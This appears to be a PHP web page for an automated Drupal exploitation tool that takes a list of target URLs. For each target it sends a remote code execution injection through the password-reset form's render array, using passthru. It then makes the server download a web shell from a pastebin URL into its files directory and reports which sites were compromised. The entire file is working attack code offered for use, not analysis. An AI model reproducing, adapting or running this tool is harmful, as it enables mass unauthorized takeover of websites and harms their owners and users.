<?php
$judul=@Drupal_Auto_Xploit;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
          
          <center>
	<form action="" method="post">
<textarea name="url" class="form-control text-primary" autocomplete="off" style="height:400px; "></textarea><br>
	<br>
<input type="submit" name="bom" class="btn btn-outline-warning" value="Start">
</form></center>
<br>
 <?php
error_reporting(0);
function curl($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;
        }
function sending($sss,$cc){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sss.'/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=curl+-o+sites/default/files/4dhaxor.php+"https://pastebin.com/raw/vKfyPDA3"');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS,'form_id=user_pass&_triggering_element_name=name');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $ee = curl_exec($ch);
        curl_close($ch);
        return $ee;
        }
function sendingajax($sss,$cc){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sss.'/?q=file/ajax/name/%23value/'.$cc);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS,'form_build_id='.$cc);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $ee = curl_exec($ch);
        curl_close($ch);
        return $ee;
        }

    $beby = explode("\r\n", $_POST['url']);
    if($_POST['bom']){
    foreach($beby as $aa){
    $url = curl($aa."/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=uname+-a");
    if(preg_match('/value="form-/', $url)){
    $get = curl($aa."/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=uname+-a");
    if(preg_match('# type="hidden" name="form_build_id" value="(.*?)"#is', $get, $matches)){
    $ez = $matches[1];
    $send = sending($aa,$ez);
    if(preg_match('# type="hidden" name="form_build_id" value="(.*?)"#is', $send, $matches)){
    $ez1 = $matches[1];
    $send_ajax = sendingajax($aa,$ez1);
    $cekshell=curl("$aa/sites/default/files/sdx.php");
          if(preg_match('/4d_h4x0r/', $cekshell)){
            echo " 
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=green>Senpai Daisuki Upload Done</font><br>
            [ Drupal ] Shell -> <a href=$aa/sites/default/files/sdx.php>Cek Shell</a><br>
            [ Drupal ] <font color=green>Done ~</font><br>";
            } else { 
            echo "
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=red>Upload Error</font><br>
            [ Drupal ] <font color=red>Done ~</font><br>";
            }

    }
    }
    } else {
           echo "
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=red>Yamete Oniichan, Ba-bakaa >//< Not Vuln</font><br>
            [ Drupal ] <font color=red>Done ~</font><br>";
            } 
       }
         }
?>
<br/>